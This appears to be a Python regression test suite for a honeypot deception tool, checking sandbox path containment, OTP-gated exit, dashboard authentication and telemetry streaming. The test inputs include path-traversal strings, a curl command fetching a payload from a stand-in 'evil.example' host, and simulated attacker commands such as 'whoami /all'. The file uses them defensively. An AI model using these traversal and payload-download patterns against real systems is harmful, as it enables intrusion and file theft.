import asyncio
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
import unittest
from unittest.mock import patch

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from PyQt6.QtCore import Qt
from PyQt6.QtGui import QKeyEvent
from PyQt6.QtTest import QTest
from PyQt6.QtWidgets import QApplication

import dashboard.app as dash_app
from deception.command_engine import VirtualCommandEngine
from deception.decoy_chrome import DecoyChrome
from deception.decoy_explorer import DecoyExplorer
from deception.decoy_notepad import DecoyNotepad
from deception.forensic_tracker import get_tracker
from deception.honey_desktop import HoneypotDesktop, HoneypotVerificationDialog
from deception.virtual_fs import (
    get_vfs,
    resolve_contained_sandbox_path,
    safe_sandbox_path,
)
from ml_engine.models import BehavioralModels
from telemetry.agent import TelemetryAgent
from telemetry.environmental_sensor import EnvironmentalSensorMonitor
from telemetry.evaluator import ThreatEvaluator


class TestBugHuntRegressions(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = QApplication.instance()
        if cls.app is None:
            cls.app = QApplication(sys.argv)

    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory(prefix="bug_hunt_reg_")
        self.tracker = get_tracker()
        self.tracker.use_temp_storage(self.tmp_dir.name)
        self.vfs = get_vfs()
        self.vfs.use_temp_state(os.path.join(self.tmp_dir.name, "vfs_state.json"))
        self.sandbox_dir = self.tracker.sandbox_dir
        self.log_dir = self.tracker.log_dir

    def tearDown(self):
        self.vfs.restore_state_file()
        self.tracker.restore_storage()
        for fname in (".active_otp", ".session_reset"):
            p = os.path.join(PROJECT_ROOT, "models", fname)
            if os.path.exists(p):
                try:
                    os.remove(p)
                except Exception:
                    pass
        os.environ.pop("ALLOW_DEMO_ESCAPE", None)
        os.environ.pop("EMERGENCY_RECOVERY_KEY", None)
        os.environ.pop("MASTER_BYPASS_PASSWORD", None)
        self.tmp_dir.cleanup()

    # ------------------------------------------------------------------
    # P0-1: Sandbox Path Traversal Containment
    # ------------------------------------------------------------------
    def test_01_sandbox_path_helpers_and_traversal_blocking(self):
        outside_secret = os.path.join(self.tmp_dir.name, "outside_secret.txt")
        with open(outside_secret, "w", encoding="utf-8") as f:
            f.write("HOST_SECRET_DO_NOT_READ")

        self.assertIsNone(resolve_contained_sandbox_path(self.sandbox_dir, "../outside_secret.txt"))
        self.assertIsNone(resolve_contained_sandbox_path(self.sandbox_dir, r"..\..\Windows\win.ini"))
        self.assertIsNone(resolve_contained_sandbox_path(self.sandbox_dir, outside_secret))

        contained_write = safe_sandbox_path(self.sandbox_dir, r"../../../Users/victim/Desktop/dropper.bat")
        self.assertIsNotNone(contained_write)
        self.assertEqual(os.path.dirname(os.path.realpath(contained_write)), os.path.realpath(self.sandbox_dir))
        self.assertEqual(os.path.basename(contained_write), "dropper.bat")

        engine = VirtualCommandEngine(self.sandbox_dir, self.log_dir)
        out_read, _ = engine.execute("type ../outside_secret.txt")
        self.assertNotIn("HOST_SECRET_DO_NOT_READ", out_read)
        self.assertIn("Cannot find path", out_read)

        out_abs, _ = engine.execute(f'type "{outside_secret}"')
        self.assertNotIn("HOST_SECRET_DO_NOT_READ", out_abs)

        # curl -o traversal must divert inside sandbox_dir only
        engine.execute("curl http://evil.example/a.exe -o ../../escape_payload.exe")
        self.assertFalse(os.path.exists(os.path.join(self.tmp_dir.name, "escape_payload.exe")))
        self.assertTrue(os.path.exists(os.path.join(self.sandbox_dir, "escape_payload.exe")))

        # Browser download path traversal check
        chrome = DecoyChrome(sandbox_dir=self.sandbox_dir)
        chrome.internet_enabled = True
        chrome.navigate_to_real_web("http://192.0.2.5/..%2f..%2fevil_payload.exe?dl=1")
        self.assertFalse(os.path.exists(os.path.join(os.path.dirname(self.sandbox_dir), "evil_payload.exe")))

        # Notepad write check stays contained inside sandbox_dir
        notepad = DecoyNotepad(self.sandbox_dir, self.log_dir)
        notepad.current_vfs_path = "C:\\Users\\Dell\\..\\evil_note.txt"
        notepad.editor.setPlainText("quarantined note")
        self.assertTrue(os.path.exists(os.path.join(self.sandbox_dir, "evil_note.txt")))

    # ------------------------------------------------------------------
    # P0-3: Unauthenticated Honeypot Exit Blocked by Default
    # ------------------------------------------------------------------
    def test_02_honeypot_exit_requires_authentication_by_default(self):
        evaluator = ThreatEvaluator()
        evaluator.is_breached = True
        evaluator.active_otp = "482910"
        evaluator._save_active_otp("482910")

        desktop = HoneypotDesktop(evaluator=evaluator)
        dlg = HoneypotVerificationDialog(desktop)

        # Without ALLOW_DEMO_ESCAPE=1, clicking emergency_exit with blank or trivial input MUST fail
        dlg.input_field.setText("")
        dlg.emergency_exit()
        self.assertFalse(desktop._can_close)

        dlg.input_field.setText("admin")
        dlg.emergency_exit()
        self.assertFalse(desktop._can_close)

        # Double-Escape without ALLOW_DEMO_ESCAPE=1 must open verification dialog rather than closing
        desktop._last_esc_time = time.time()
        with patch.object(desktop, "show_verification_prompt") as mock_prompt:
            esc_event = QKeyEvent(QKeyEvent.Type.KeyPress, Qt.Key.Key_Escape, Qt.KeyboardModifier.NoModifier)
            desktop.keyPressEvent(esc_event)
            self.assertFalse(desktop._can_close)
            mock_prompt.assert_called_once()

        # Valid OTP DOES authorize unlock cleanly
        with patch("ml_engine.train.adapt_to_verified_drift"), \
             patch.object(evaluator.controller, "learn_from_session"), \
             patch("dashboard.forensic_dashboard.ForensicDashboard"):
            dlg.input_field.setText("482910")
            dlg.verify_code()
            self.assertTrue(desktop._can_close)
            self.assertFalse(evaluator.is_breached)

        # Dev-only ALLOW_DEMO_ESCAPE=1 works ONLY when explicitly set
        os.environ["ALLOW_DEMO_ESCAPE"] = "1"
        desktop2 = HoneypotDesktop(evaluator=evaluator)
        dlg2 = HoneypotVerificationDialog(desktop2)
        dlg2.emergency_exit()
        self.assertTrue(desktop2._can_close)

    # ------------------------------------------------------------------
    # P0-2 & P1-1: Web Dashboard Auth Reset, No OTP Leak, Real AI & Stream
    # ------------------------------------------------------------------
    def test_03_dashboard_reset_auth_no_otp_leak_and_ai_intel(self):
        orig_out = dash_app.report_generator.output_dir
        orig_tfile = dash_app.streamer.telemetry_file
        orig_disable_sim = os.environ.get("DISABLE_SIM_TELEMETRY_WRITE")
        dash_app.report_generator.output_dir = self.log_dir
        dash_app.streamer.telemetry_file = os.path.join(self.tmp_dir.name, "telemetry.jsonl")
        os.environ["DISABLE_SIM_TELEMETRY_WRITE"] = "1"

        try:
            def _run_coro_no_loop(coro):
                """Drives async FastAPI handlers without spawning a Windows socketpair event loop."""
                try:
                    return coro.send(None)
                except StopIteration as exc:
                    return exc.value

            async def direct_to_thread(fn, *args, **kwargs):
                return fn(*args, **kwargs)

            async def noop_broadcast(*args, **kwargs):
                return None

            with patch.object(asyncio, "to_thread", side_effect=direct_to_thread), \
                 patch.object(dash_app.ws_manager, "broadcast", side_effect=noop_broadcast), \
                 patch.object(dash_app.ai_analyzer, "check_ollama_available", return_value=(False, [])), \
                 patch("telemetry.evaluator.dispatch_otp", return_value=True), \
                 patch("telemetry.evaluator.capture_intruder", return_value=None):
                # 1. Simulate anomaly
                sim = _run_coro_no_loop(dash_app.handle_simulate_anomaly("acute_spike", 0.90))
                self.assertTrue(sim["is_breached"])
                self.assertTrue(sim["is_simulated"])
                self.assertTrue(sim["otp_issued"])
                sim_otp = sim.get("simulated_otp")
                self.assertTrue(sim_otp and len(str(sim_otp)) == 6)

                # 2. /api/status must NEVER leak active_otp in plaintext
                status = _run_coro_no_loop(dash_app.get_system_status())
                self.assertNotIn("active_otp", status)
                self.assertTrue(status["otp_issued"])
                self.assertEqual(status["data_state"], "SIMULATED")

                # 3. Reset with 'admin' or empty key MUST fail with HTTP 403 and keep breach active
                denied = _run_coro_no_loop(dash_app.handle_security_reset("admin"))
                self.assertEqual(denied.status_code, 403)
                self.assertTrue(dash_app.evaluator.is_breached)

                denied_empty = _run_coro_no_loop(dash_app.handle_security_reset(""))
                self.assertEqual(denied_empty.status_code, 403)
                self.assertTrue(dash_app.evaluator.is_breached)

                # 4. Forensics endpoint serves dynamic AI analysis matching logged traps
                self.tracker.record_shell_command("whoami /all", "C:\\Windows\\system32")
                self.tracker.record_file_access("passwords.txt", action="OPEN")
                latest = _run_coro_no_loop(dash_app.get_latest_forensics())
                self.assertIn("ai_analysis", latest)
                self.assertIn(latest["ai_analysis"]["threat_level"], ("MEDIUM", "HIGH", "CRITICAL"))
                self.assertNotEqual(latest["ai_analysis"]["attacker_persona"], "Awaiting Intruder Event")

                # 5. Reset with valid simulated OTP MUST succeed and normalize state
                with patch("ml_engine.train.adapt_to_verified_drift"), \
                     patch.object(dash_app.evaluator.controller, "learn_from_session"):
                    ok = _run_coro_no_loop(dash_app.handle_security_reset(sim_otp))
                self.assertIsInstance(ok, dict)
                self.assertEqual(ok["status"], "success")
                self.assertFalse(ok["is_breached"])
                self.assertFalse(dash_app.evaluator.is_breached)
        finally:
            dash_app.report_generator.output_dir = orig_out
            dash_app.streamer.telemetry_file = orig_tfile
            if orig_disable_sim is None:
                os.environ.pop("DISABLE_SIM_TELEMETRY_WRITE", None)
            else:
                os.environ["DISABLE_SIM_TELEMETRY_WRITE"] = orig_disable_sim

    def test_04_telemetry_streamer_truncation_and_partial_line_safety(self):
        tpath = os.path.join(self.tmp_dir.name, "stream_test.jsonl")
        streamer = dash_app.TelemetryStreamer()
        streamer.telemetry_file = tpath

        # Partial write without trailing newline must wait cleanly
        with open(tpath, "w", encoding="utf-8") as f:
            f.write('{"dwell_mean": 0.1')
        self.assertIsNone(streamer._read_next_telemetry_line())

        # Completing the newline delivers the parsed row
        with open(tpath, "a", encoding="utf-8") as f:
            f.write('0, "keystroke_count": 5}\n')
        row1 = streamer._read_next_telemetry_line()
        self.assertIsNotNone(row1)
        self.assertEqual(row1["keystroke_count"], 5)

        # File truncation / rotation resets offset and reads new lines
        with open(tpath, "w", encoding="utf-8") as f:
            f.write('{"dwell_mean": 0.25, "keystroke_count": 9}\n')
        row2 = streamer._read_next_telemetry_line()
        self.assertIsNotNone(row2)
        self.assertEqual(row2["keystroke_count"], 9)

    # ------------------------------------------------------------------
    # P1-2: Mouse Baseline Calibration, Tier-2 Wiring & Cross-Process Sync
    # ------------------------------------------------------------------
    def test_05_dynamic_mouse_baseline_save_load_and_legacy_fallback(self):
        rows = []
        for idx in range(35):
            rows.append({
                "keystroke_count": 20,
                "dwell_mean": 0.095,
                "dwell_std": 0.015,
                "flight_mean": 0.125,
                "flight_std": 0.02,
                "app_dwell_mean": 0.095,
                "app_flight_mean": 0.125,
                "app_backspace_ratio": 0.1,
                "app_special_ratio": 0.15,
                "app_scroll_count": 3,
                "app_pause_ratio": 0.3,
                "mouse_events": 25,
                "mouse_velocity_mean": 920.0 + (idx % 5) * 4.0,
                "mouse_acceleration_mean": 110.0 + (idx % 3) * 2.0,
                "mouse_jerk_mean": 18.0 + (idx % 4) * 0.5,
                "mouse_straightness_mean": 0.94,
                "hour_of_day": 15,
                "cpu_usage": 12.0,
                "ram_usage_mb": 300.0,
                "active_app": "Code.exe",
            })

        model_path = os.path.join(self.tmp_dir.name, "custom_models.pkl")
        bm = BehavioralModels()
        bm.train(rows)
        self.assertAlmostEqual(bm.mouse_baseline["medians"][0], 928.0, delta=15.0)
        bm.save(model_path)

        loaded = BehavioralModels()
        loaded.load(model_path)
        self.assertAlmostEqual(loaded.mouse_baseline["medians"][0], bm.mouse_baseline["medians"][0], delta=0.01)

        ev = ThreatEvaluator(models_path=model_path)
        # User's own ~928 px/s speed should score high normality under learned mouse baseline
        conf_user = ev.evaluate_mouse_dynamics({
            "mouse_events": 25,
            "mouse_velocity_mean": 928.0,
            "mouse_acceleration_mean": 112.0,
            "mouse_jerk_mean": 18.5,
            "mouse_straightness_mean": 0.94,
        })
        conf_mismatch = ev.evaluate_mouse_dynamics({
            "mouse_events": 25,
            "mouse_velocity_mean": 120.0,
            "mouse_acceleration_mean": 5.0,
            "mouse_jerk_mean": 0.5,
            "mouse_straightness_mean": 0.35,
        })
        self.assertGreater(conf_user, conf_mismatch)
        self.assertGreater(conf_user, 0.85)

    def test_06_cross_process_sync_and_tier2_step_up_wiring(self):
        ev_worker = ThreatEvaluator()
        ev_web = ThreatEvaluator()

        # Simulate Tier 2 moderate drift directly in evaluator
        ev_worker.orchestrator.current_tier = ev_worker.orchestrator.current_tier
        tier2_row = {
            "keystroke_count": 20, "dwell_mean": 0.21, "dwell_std": 0.04,
            "flight_mean": 0.30, "flight_std": 0.06,
            "app_dwell_mean": 0.21, "app_flight_mean": 0.30,
            "app_backspace_ratio": 0.15, "app_special_ratio": 0.10,
            "app_click_count": 3, "app_scroll_count": 1, "app_pause_ratio": 0.20,
            "interaction_mode": "general_productivity",
            "mouse_events": 25, "mouse_velocity_mean": 520.0,
            "mouse_acceleration_mean": 40.0, "mouse_jerk_mean": 6.0,
            "mouse_straightness_mean": 0.72,
            "hour_of_day": 14, "cpu_usage": 20.0, "ram_usage_mb": 260.0,
            "active_app": "Code.exe",
            "owner_phone_present": True, "ble_proximity_state": "FAR",
            "is_untrusted_network": True,
        }
        with patch("telemetry.evaluator.dispatch_otp", return_value=True), \
             patch("telemetry.evaluator.capture_intruder", return_value=None):
            ev_worker.evaluate_row(tier2_row)
        if ev_worker.last_policy_action and ev_worker.last_policy_action.tier.value == "TIER_2_MEDIUM":
            # Peer sync must read step-up OTP WITHOUT promoting Tier 2 challenge to full Tier 3 breach
            ev_web.sync_cross_process_state()
            self.assertFalse(ev_web.is_breached)

        # Tier 3 breach in worker -> peer sync detects breach -> web reset clears worker!
        ev_worker.is_breached = True
        ev_worker.active_otp = "739104"
        ev_worker._save_active_otp("739104", is_breach=True)

        self.assertEqual(ev_web.sync_cross_process_state(), "BREACHED")
        self.assertTrue(ev_web.is_breached)

        with patch("ml_engine.train.adapt_to_verified_drift"), \
             patch.object(ev_web.controller, "learn_from_session"):
            self.assertTrue(ev_web.verify_otp_and_reset("739104"))

        self.assertEqual(ev_worker.sync_cross_process_state(), "RESET")
        self.assertFalse(ev_worker.is_breached)
        self.assertIsNone(ev_worker.active_otp)

    # ------------------------------------------------------------------
    # P2: ForensicTracker Session Isolation, Explorer Persist, SSID Cleanliness
    # ------------------------------------------------------------------
    def test_07_forensic_tracker_isolation_and_explorer_permanent_delete(self):
        self.assertNotIn("$$$$$5", EnvironmentalSensorMonitor.DEFAULT_TRUSTED_SSIDS)

        # Create a rich old session and archive it
        self.tracker.record_shell_command("whoami /all", "C:\\Windows\\system32")
        self.tracker.record_file_access("passwords.txt", action="OPEN")
        old_sid = self.tracker.session_id

        # Start new session -> old events must NEVER leak into timeline by default
        new_sid = self.tracker.start_new_session(archive_previous=True)
        self.assertNotEqual(old_sid, new_sid)
        timeline = self.tracker.get_timeline()
        self.assertEqual(len(timeline), 1)
        self.assertEqual(timeline[0]["action_type"], "HONEYPOT_ACTIVATED")

        # Explorer permanent deletion must persist to VFS state file
        test_doc = "C:\\Users\\Dell\\Desktop\\temp_perm_delete.txt"
        self.vfs.create_file(test_doc, content="dispose me", overwrite=True)
        self.vfs.delete(test_doc, to_recycle_bin=True)
        rb_items = self.vfs.get_recycle_bin_items()
        target_entry = next(e for e in rb_items if e.original_path.lower() == test_doc.lower())

        explorer = DecoyExplorer(self.sandbox_dir, self.log_dir)
        target_entry.node._recycle_entry_id = target_entry.entry_id
        explorer.permanently_delete_node(target_entry.node)

        with open(self.vfs.state_file_path, "r", encoding="utf-8") as f:
            persisted = json.load(f)
        self.assertNotIn(target_entry.entry_id, persisted.get("recycle_bin", {}))

    # ------------------------------------------------------------------
    # Release-Audit Repairs: Lock Screen Bypass Gate, Evaluator Tail & Supervisor Lock
    # ------------------------------------------------------------------
    def test_08_lock_screen_gates_bypass_and_recovery_alias_consistency(self):
        from security.lock_handler import VerificationLockScreen
        from security.risk_orchestrator import DynamicRiskOrchestrator

        ev = ThreatEvaluator()
        ev.is_breached = True
        ev.active_otp = "135792"

        os.environ.pop("ALLOW_DEMO_ESCAPE", None)
        lock_prod = VerificationLockScreen(ev)
        self.assertFalse(hasattr(lock_prod, "bypass_btn"))

        os.environ["ALLOW_DEMO_ESCAPE"] = "1"
        lock_dev = VerificationLockScreen(ev)
        self.assertTrue(hasattr(lock_dev, "bypass_btn"))

        # Verify MASTER_BYPASS_PASSWORD alias is honored identically across Orchestrator & Evaluator
        os.environ["MASTER_BYPASS_PASSWORD"] = "RecoverKey#2026"
        orch = DynamicRiskOrchestrator()
        ok_step, _ = orch.verify_step_up("RecoverKey#2026", "999999")
        self.assertTrue(ok_step)

        with patch("ml_engine.train.adapt_to_verified_drift"), \
             patch.object(ev.controller, "learn_from_session"):
            self.assertTrue(ev.verify_otp_and_reset("RecoverKey#2026"))

    def test_09_evaluator_stream_rotation_and_utf8_safety(self):
        ev = ThreatEvaluator()
        tpath = os.path.join(self.tmp_dir.name, "eval_stream.jsonl")

        # Initial line with non-ASCII Unicode title & partial write recovery
        with open(tpath, "w", encoding="utf-8") as f:
            f.write('{"active_window": "Docs \u2014 UTF8 ')
        line, offset, head = ev._read_next_line_from_stream(tpath, 0, "")
        self.assertIsNone(line)
        self.assertEqual(offset, 0)

        with open(tpath, "a", encoding="utf-8") as f:
            f.write('\U0001f512", "keystroke_count": 4}\n')
        line, offset, head = ev._read_next_line_from_stream(tpath, offset, head)
        self.assertIsNotNone(line)
        parsed = json.loads(line)
        self.assertEqual(parsed["keystroke_count"], 4)

        # Simulate file rotation / rewrite with shorter file -> must reset offset to 0 and read new entry
        with open(tpath, "w", encoding="utf-8") as f:
            f.write('{"keystroke_count": 11}\n')
        line2, offset2, _ = ev._read_next_line_from_stream(tpath, offset, head)
        self.assertIsNotNone(line2)
        self.assertEqual(json.loads(line2)["keystroke_count"], 11)

    def test_10_supervisor_duplicate_prevention_and_occupied_port_abort(self):
        from run_system import SystemSupervisor

        # 1. Occupied port MUST abort cleanly without spawning ANY worker subprocesses
        blocker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        blocker.bind(("127.0.0.1", 0))
        blocker.listen(1)
        busy_port = blocker.getsockname()[1]
        lock_file = os.path.join(self.tmp_dir.name, "sup.lock")
        sup_busy = SystemSupervisor(port=busy_port, enable_browser=False, enable_tray=False, lock_path=lock_file)
        try:
            with self.assertRaises(RuntimeError):
                sup_busy.start_all_workers()
            for worker in sup_busy.workers.values():
                self.assertIsNone(worker.pid())
        finally:
            sup_busy._release_supervisor_lock()
            blocker.close()

        # 2. Active lock held by another running python process using run_system MUST block duplicate start
        sleeper = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(10)  # run_system.py"],
            cwd=PROJECT_ROOT,
        )
        try:
            with open(lock_file, "w", encoding="utf-8") as f:
                json.dump({"pid": sleeper.pid, "port": 8096, "started_at": time.time()}, f)
            sup_dup = SystemSupervisor(port=8096, enable_browser=False, enable_tray=False, lock_path=lock_file)
            with self.assertRaises(RuntimeError):
                sup_dup.start_all_workers()
        finally:
            sleeper.terminate()
            sleeper.wait(timeout=3)

    def test_11_uvicorn_real_websocket_delivery(self):
        """Verifies live uvicorn accepts RFC 6455 /ws/telemetry connections and streams JSONL events."""
        import urllib.request
        import websockets

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()

        tfile = os.path.join(self.tmp_dir.name, "ws_live.jsonl")
        with open(tfile, "w", encoding="utf-8") as f:
            f.write("")

        env = os.environ.copy()
        env["TELEMETRY_LOG_PATH"] = tfile
        env["HEADLESS_TEST"] = "1"
        env["DISABLE_SIM_TELEMETRY_WRITE"] = "1"

        srv = subprocess.Popen(
            [sys.executable, "-m", "uvicorn", "dashboard.app:app", "--host", "127.0.0.1", "--port", str(port)],
            cwd=PROJECT_ROOT,
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            deadline = time.time() + 20.0
            status_data = None
            while time.time() < deadline:
                try:
                    with urllib.request.urlopen(f"http://127.0.0.1:{port}/api/status", timeout=1.5) as resp:
                        if resp.status == 200:
                            status_data = json.loads(resp.read().decode("utf-8"))
                            break
                except Exception:
                    time.sleep(0.3)

            self.assertIsNotNone(status_data, "Live dashboard server failed to become healthy")
            self.assertEqual(status_data["status"], "ONLINE")
            self.assertNotIn("active_otp", status_data)

            async def _ws_client():
                async with websockets.connect(f"ws://127.0.0.1:{port}/ws/telemetry") as ws:
                    init_msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=5.0))
                    self.assertEqual(init_msg["type"], "INITIAL_SNAPSHOT")

                    row = {
                        "timestamp": time.time(),
                        "hour_of_day": 14,
                        "keystroke_count": 21,
                        "dwell_mean": 0.092,
                        "dwell_std": 0.015,
                        "flight_mean": 0.120,
                        "flight_std": 0.020,
                        "app_dwell_mean": 0.092,
                        "app_flight_mean": 0.120,
                        "app_backspace_ratio": 0.08,
                        "app_special_ratio": 0.14,
                        "app_click_count": 2,
                        "app_scroll_count": 3,
                        "app_pause_ratio": 0.25,
                        "interaction_mode": "coding",
                        "mouse_events": 24,
                        "mouse_velocity_mean": 240.0,
                        "mouse_acceleration_mean": 11.0,
                        "mouse_jerk_mean": 1.0,
                        "mouse_straightness_mean": 0.91,
                        "active_app": "Code.exe",
                        "active_window": "verify.py - VS Code",
                        "cpu_usage": 4.2,
                        "ram_usage_mb": 215.0,
                    }
                    with open(tfile, "a", encoding="utf-8") as tf:
                        tf.write(json.dumps(row) + "\n")
                        tf.flush()

                    delivered = None
                    for _ in range(10):
                        frame = json.loads(await asyncio.wait_for(ws.recv(), timeout=5.0))
                        if frame.get("type") == "TELEMETRY_UPDATE" and frame["data"].get("append_chart") is True:
                            delivered = frame
                            break
                    self.assertIsNotNone(delivered)
                    self.assertEqual(delivered["data"]["keystroke_count"], 21)
                    self.assertEqual(delivered["data"]["data_state"], "LIVE")

            asyncio.run(_ws_client())
        finally:
            srv.terminate()
            srv.wait(timeout=5)

    def test_12_security_hardening_real_breach_otp_and_expired_recovery(self):
        from security.otp_service import get_alert_config

        # 1. Empty EMERGENCY_RECOVERY_KEY must NOT shadow MASTER_BYPASS_PASSWORD
        os.environ["EMERGENCY_RECOVERY_KEY"] = ""
        os.environ["MASTER_BYPASS_PASSWORD"] = "AliasFallback#2026"
        try:
            cfg = get_alert_config()
            self.assertEqual(cfg["security"]["emergency_recovery_key"], "AliasFallback#2026")
        finally:
            os.environ.pop("EMERGENCY_RECOVERY_KEY", None)
            os.environ.pop("MASTER_BYPASS_PASSWORD", None)

        # 2. Expired .active_otp must NOT block EMERGENCY_RECOVERY_KEY recovery
        ev = ThreatEvaluator()
        ev.is_breached = True
        ev.active_otp = "246810"
        otp_file = os.path.join(PROJECT_ROOT, "models", ".active_otp")
        os.makedirs(os.path.dirname(otp_file), exist_ok=True)
        with open(otp_file, "w", encoding="utf-8") as f:
            json.dump({"otp": "246810", "expires_at": time.time() - 60}, f)

        os.environ["EMERGENCY_RECOVERY_KEY"] = "OwnerSecret#2026"
        try:
            # Trivial credential must be rejected AND increment failure counter
            prev_failures = getattr(ev, "_failed_verification_attempts", 0)
            self.assertFalse(ev.verify_otp_and_reset("admin"))
            self.assertEqual(ev._failed_verification_attempts, prev_failures + 1)

            with patch("ml_engine.train.adapt_to_verified_drift"), \
                 patch.object(ev.controller, "learn_from_session"):
                self.assertTrue(ev.verify_otp_and_reset("OwnerSecret#2026"))
        finally:
            os.environ.pop("EMERGENCY_RECOVERY_KEY", None)

        # 3. handle_simulate_anomaly must NEVER leak a real breach OTP
        orig_disable = os.environ.get("DISABLE_SIM_TELEMETRY_WRITE")
        os.environ["DISABLE_SIM_TELEMETRY_WRITE"] = "1"
        dash_app.active_breach_is_simulated = False
        dash_app.evaluator.is_breached = True
        dash_app.evaluator.active_otp = "918273"
        try:
            async def noop_broadcast(*args, **kwargs):
                return None

            coro = dash_app.handle_simulate_anomaly("acute_spike", 0.90)
            with patch.object(dash_app.ws_manager, "broadcast", side_effect=noop_broadcast):
                try:
                    res = coro.send(None)
                except StopIteration as exc:
                    res = exc.value
            self.assertTrue(res["otp_redacted"])
            self.assertIsNone(res["simulated_otp"])
            self.assertEqual(dash_app.evaluator.active_otp, "918273")
        finally:
            dash_app.evaluator.is_breached = False
            dash_app.evaluator.active_otp = None
            dash_app.active_breach_is_simulated = False
            if orig_disable is None:
                os.environ.pop("DISABLE_SIM_TELEMETRY_WRITE", None)
            else:
                os.environ["DISABLE_SIM_TELEMETRY_WRITE"] = orig_disable


if __name__ == "__main__":
    unittest.main()
